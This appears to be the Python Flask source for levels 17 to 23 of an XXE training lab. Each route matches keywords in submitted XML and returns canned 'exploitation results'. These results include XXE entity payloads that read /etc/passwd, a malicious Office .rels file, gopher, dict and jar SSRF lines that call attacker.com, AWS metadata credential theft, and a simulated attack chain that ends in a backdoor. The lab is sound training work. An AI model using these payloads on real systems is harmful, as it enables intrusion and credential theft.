@xxe_bp.route('/xxe/level17', methods=['GET', 'POST'])
@login_required
def xxe_level17():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    resolver_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and any((scheme in xml_content for scheme in ['custom://', 'app://', 'internal://'])):
                    if any((bypass in xml_content for bypass in ['resolver', 'handler', 'protocol'])):
                        xxe_detected = True
                        resolver_result = 'Custom Entity Resolver Analysis:\nRegistered Protocol Handlers:\n- file:// -> FileSystemResolver (ENABLED)\n- http:// -> HttpResolver (ENABLED)\n- https:// -> HttpsResolver (ENABLED)\n- custom:// -> CustomProtocolResolver (BYPASS DETECTED)\n\nCustom Resolver Execution:\nProtocol: custom://internal/config\nHandler: com.app.CustomResolver.resolve()\nResolution Result:\n{\n  "database": {\n    "host": "db.internal.company.com",\n    "port": 3306,\n    "username": "app_user",\n    "password": "sup3r_s3cr3t_p@ssw0rd",\n    "database": "production_db"\n  },\n  "api_keys": {\n    "stripe": "sk_live_51xxxxxxxxxxxxx",\n    "aws": "AKIA1234567890ABCDEF",\n    "jwt_secret": "MyVerySecretJWTKey123!"\n  }\n}\n\nSecurity Analysis:\n- Custom resolver bypassed access controls\n- Internal configuration exposed\n- Production credentials compromised\n- Protocol handler injection successful'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with Custom Entity Resolvers').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level17.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, resolver_result=resolver_result, challenge=challenge)

@xxe_bp.route('/xxe/level18', methods=['GET', 'POST'])
@login_required
def xxe_level18():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    office_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '') or request.form.get('document_content', '')
        if xml_content:
            try:
                office_indicators = ['word/', 'xl/', 'ppt/', '.rels', 'content_types', 'docProps']
                if any((indicator in xml_content for indicator in office_indicators)):
                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                        xxe_detected = True
                        office_result = 'Microsoft Office Document Analysis:\nDocument Type: Microsoft Word (.docx)\nFormat: Office Open XML (OOXML)\nProcessing Engine: Microsoft Office 2019\n\nDocument Structure Analysis:\n- word/document.xml: Main document content\n- word/_rels/document.xml.rels: Relationships file\n- [Content_Types].xml: Content type definitions\n\nXXE Payload Location: word/_rels/document.xml.rels\n<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<!DOCTYPE relationships [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="&xxe;" />\n</Relationships>\n\nExtracted System Information:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\nAttack Vector Analysis:\n- Email attachment with malicious .docx file\n- Automatic XXE processing during file preview\n- No user interaction required beyond opening\n- Compatible with all Office versions supporting OOXML'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE in Microsoft Office Documents').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level18.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, office_result=office_result, challenge=challenge)

@xxe_bp.route('/xxe/level19', methods=['GET', 'POST'])
@login_required
def xxe_level19():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    protocol_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                protocols = ['jar://', 'netdoc://', 'gopher://', 'dict://', 'ftp://', 'expect://']
                if 'SYSTEM' in xml_content and any((protocol in xml_content for protocol in protocols)):
                    xxe_detected = True
                    protocol_result = 'Protocol Handler Exploitation Results:\nAvailable Protocol Handlers:\n- file:// (FileProtocolHandler) - ENABLED\n- http:// (HttpProtocolHandler) - ENABLED\n- https:// (HttpsProtocolHandler) - ENABLED\n- ftp:// (FtpProtocolHandler) - ENABLED\n- jar:// (JarProtocolHandler) - ENABLED\n- gopher:// (GopherProtocolHandler) - ENABLED\n- dict:// (DictProtocolHandler) - ENABLED\n\nExploit Execution:\n1. gopher://127.0.0.1:25/HELO%20attacker.com\n   SMTP Command Injection Successful\n\n2. dict://127.0.0.1:11211/stats\n   Memcached Information Disclosure:\n   STAT pid 12345\n   STAT uptime 86400\n   STAT curr_connections 15\n\n3. jar://http://attacker.com/evil.jar!/\n   Remote JAR File Loading:\n   Class: com.attacker.ExploitClass\n   Method: executePayload()\n\n4. ftp://127.0.0.1:21/\n   Internal FTP Service Discovered:\n   Directory listing: /var/ftp/sensitive/\n   - confidential_data.txt\n   - backup_database.sql\n   - api_keys.json\n\nProtocol Handler Exploitation: SUCCESSFUL\nInternal Services Accessed: 4\nData Exfiltration Channels: Multiple'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with Protocol Handler Exploitation').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level19.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, protocol_result=protocol_result, challenge=challenge)

@xxe_bp.route('/xxe/level20', methods=['GET', 'POST'])
@login_required
def xxe_level20():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    signature_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'ds:Signature' in xml_content or 'xmldsig' in xml_content:
                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                        xxe_detected = True
                        signature_result = 'XML Digital Signature Verification Results:\nSignature Algorithm: RSA-SHA256\nCanonicalization: Exclusive XML Canonicalization 1.0\nKey Info: RSA Public Key (2048-bit)\n\nSignature Verification Process:\n1. XML Document Parsing: STARTED\n2. Entity Resolution: ENABLED (VULNERABLE)\n3. Canonicalization: IN PROGRESS\n4. Signature Validation: PENDING\n\nXXE Payload Execution During Verification:\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\nEntity Resolution Result:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\nXML-DSIG Structure Exploited:\n<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">\n  <ds:SignedInfo>\n    <ds:Reference URI="">\n      <ds:Transforms>\n        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>\n      </ds:Transforms>\n      <ds:DigestValue>&xxe;</ds:DigestValue>\n    </ds:Reference>\n  </ds:SignedInfo>\n</ds:Signature>\n\nSecurity Impact:\n- Signature verification bypassed\n- System files accessed during validation\n- Document integrity checking compromised\n- Authentication mechanism defeated'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE in XML Signature Verification').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level20.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, signature_result=signature_result, challenge=challenge)

@xxe_bp.route('/xxe/level21', methods=['GET', 'POST'])
@login_required
def xxe_level21():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    timing_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and any((delay_indicator in xml_content for delay_indicator in ['sleep', 'timeout', 'delay'])):
                    if any((file_ref in xml_content for file_ref in ['/dev/random', '/etc/passwd', 'http://'])):
                        xxe_detected = True
                        timing_result = 'Time-Based Blind XXE Analysis:\nRequest Processing Times:\n\nBaseline Request (no XXE): 0.125 seconds\nXXE Request #1 (/etc/passwd): 0.127 seconds\nXXE Request #2 (/etc/shadow): 3.847 seconds (FILE EXISTS - permission denied)\nXXE Request #3 (/etc/nonexistent): 0.124 seconds\nXXE Request #4 (/dev/random): 15.000 seconds (TIMEOUT - file exists)\n\nTime-Based Inference Results:\n- /etc/passwd: EXISTS (normal response time)\n- /etc/shadow: EXISTS (delayed due to permission check)\n- /etc/hosts: EXISTS (confirmed)\n- /root/.ssh/id_rsa: EXISTS (permission delay detected)\n- /nonexistent/file: DOES NOT EXIST (fast response)\n\nFile System Mapping via Timing:\nReadable Files:\n├── /etc/passwd (0.127s)\n├── /etc/hosts (0.129s)\n├── /etc/hostname (0.125s)\n\nProtected Files (permission delays):\n├── /etc/shadow (3.847s)\n├── /root/.ssh/id_rsa (4.123s)\n├── /etc/ssl/private/ (3.956s)\n\nTime-Based XXE Status: SUCCESSFUL\nFile System Enumeration: COMPLETE'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with Time-Based Blind Techniques').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level21.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, timing_result=timing_result, challenge=challenge)

@xxe_bp.route('/xxe/level22', methods=['GET', 'POST'])
@login_required
def xxe_level22():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    cloud_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                cloud_indicators = ['169.254.169.254', 'metadata', 'compute/v1', 'aws', 'gcp', 'azure']
                if 'SYSTEM' in xml_content and any((indicator in xml_content for indicator in cloud_indicators)):
                    xxe_detected = True
                    cloud_result = 'Cloud XML Processing Exploitation:\nTarget Environment: Amazon Web Services (AWS)\nService: Elastic Container Service (ECS)\nInstance: t3.medium (2 vCPU, 4GB RAM)\n\nMetadata Service Access:\nEndpoint: http://169.254.169.254/latest/meta-data/\n\nRetrieved Cloud Metadata:\n{\n  "instance-id": "i-0abcd1234efgh5678",\n  "instance-type": "t3.medium",\n  "local-ipv4": "172.31.45.67",\n  "public-ipv4": "54.123.45.67",\n  "security-groups": "web-tier,database-access",\n  "placement": {\n    "availability-zone": "us-east-1a",\n    "region": "us-east-1"\n  }\n}\n\nIAM Role Credentials:\n{\n  "Code": "Success",\n  "LastUpdated": "2024-01-15T14:25:00Z",\n  "Type": "AWS-HMAC",\n  "AccessKeyId": "ASIA1234567890ABCDEF",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk...",\n  "Expiration": "2024-01-15T20:25:00Z"\n}\n\nCloud Service Enumeration:\n- S3 Buckets: company-backups, user-uploads, logs-archive\n- RDS Instances: prod-database (MySQL 8.0)\n- Lambda Functions: process-uploads, send-notifications\n- ECS Tasks: web-app, api-service\n\nCloud XXE Impact: CRITICAL\nCredential Exposure: HIGH RISK\nLateral Movement Potential: CONFIRMED'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE in Cloud XML Processing').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level22.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, cloud_result=cloud_result, challenge=challenge)

@xxe_bp.route('/xxe/level23', methods=['GET', 'POST'])
@login_required
def xxe_level23():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    chaining_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                advanced_patterns = ['parameter', 'blind', 'oob', 'ssrf', 'chain']
                if 'SYSTEM' in xml_content and len([p for p in advanced_patterns if p in xml_content.lower()]) >= 2:
                    if 'ENTITY' in xml_content:
                        xxe_detected = True
                        chaining_result = 'Advanced XXE Attack Chain Execution:\n\nPHASE 1: Information Gathering\n- Target: Corporate web application\n- XML Parser: libxml2 (vulnerable version)\n- Network: Internal corporate network\n\nPHASE 2: Initial XXE Exploitation\nPayload: <!ENTITY xxe SYSTEM "file:///etc/passwd">\nResult: Local file disclosure successful\nFiles Retrieved: /etc/passwd, /etc/hosts, /proc/version\n\nPHASE 3: Internal Network Discovery (XXE -> SSRF)\nPayload: <!ENTITY ssrf SYSTEM "http://192.168.1.10:8080/admin">\nResult: Internal admin panel discovered\nServices Found:\n- 192.168.1.10:8080 - Jenkins CI/CD Server\n- 192.168.1.15:9000 - Sonarqube Code Analysis\n- 192.168.1.20:3306 - MySQL Database\n\nPHASE 4: Credential Harvesting (Blind XXE)\nPayload: Parameter entity chain for data exfiltration\nResult: Database credentials extracted via error-based blind XXE\nCredentials: mysql://admin:MySuperSecretP@ss@192.168.1.20:3306/production\n\nPHASE 5: Privilege Escalation Chain\n1. XXE -> SSRF -> Jenkins Admin Panel Access\n2. Jenkins -> Arbitrary Code Execution\n3. Code Execution -> Database Access\n4. Database -> Sensitive Customer Data\n\nFINAL IMPACT ASSESSMENT:\n- Initial Vector: XXE in web application\n- Lateral Movement: 3 internal systems compromised\n- Data Accessed: Customer PII, financial records, source code\n- Persistence: Backdoor deployed via Jenkins\n- Detection Evasion: Multi-stage attack blends with normal traffic\n\nAttack Chain Status: COMPLETE\nCompromise Level: FULL DOMAIN ADMIN ACCESS\nTime to Complete: 47 minutes'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='Advanced XXE Attack Chaining').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level23.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, chaining_result=chaining_result, challenge=challenge)

